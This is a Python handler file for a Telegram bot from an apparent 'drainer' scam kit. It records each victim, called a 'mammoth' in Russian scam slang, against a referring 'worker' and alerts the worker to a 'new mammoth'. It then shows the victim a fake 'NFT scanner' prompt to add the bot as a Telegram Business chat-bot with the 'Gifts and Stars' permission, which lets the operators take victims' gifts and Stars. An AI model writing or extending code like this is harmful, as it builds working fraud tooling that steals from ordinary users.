# twork/tdrainer/handlers/user_handlers.py

from aiogram import Router, types
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode
from aiogram import Bot

from bot_instance import bot, worker_bot
from database import link_mammoth_to_worker
from utils import escape_md

router = Router()

async def get_instruction_text(bot_instance: Bot) -> str:
    bot_username = "NFTScanero_Bot"

    text = (
        "⚠️ You don't have a *connected business account*\\. Connect a business account to *access this feature*:\n\n"
        "> ⚙️ 1\\. *Go to settings*\n"
        "> 💼 2\\. Click on *\"Telegram for Business\"*\n"
        "> 🤖 3\\. *Select the Chat\\-bots*\n"
        f"> 🪪 4\\. *Enter bot username:* `@{bot_username}`\n"
        "> ✅ 5\\. Check the box *\"Gifts and Stars\"*"
    )
    return text

@router.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    args = message.text.split()
    worker_id = 0 # По умолчанию воркер @None
    
    if len(args) > 1 and args[1].isdigit():
        worker_id = int(args[1])

    mammoth_user = message.from_user
    is_new_link = link_mammoth_to_worker(mammoth_id=mammoth_user.id, worker_id=worker_id)

    if is_new_link and worker_id != 0:
        try:
            mammoth_name = escape_md(mammoth_user.full_name)
            
            await worker_bot.send_message(
                worker_id,
                f"🎉 У вас новый мамонт: *{mammoth_name}*",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление воркеру {worker_id}: {e}")

    final_text = await get_instruction_text(bot)
    await message.answer(
        text=final_text,
        parse_mode=ParseMode.MARKDOWN_V2
    )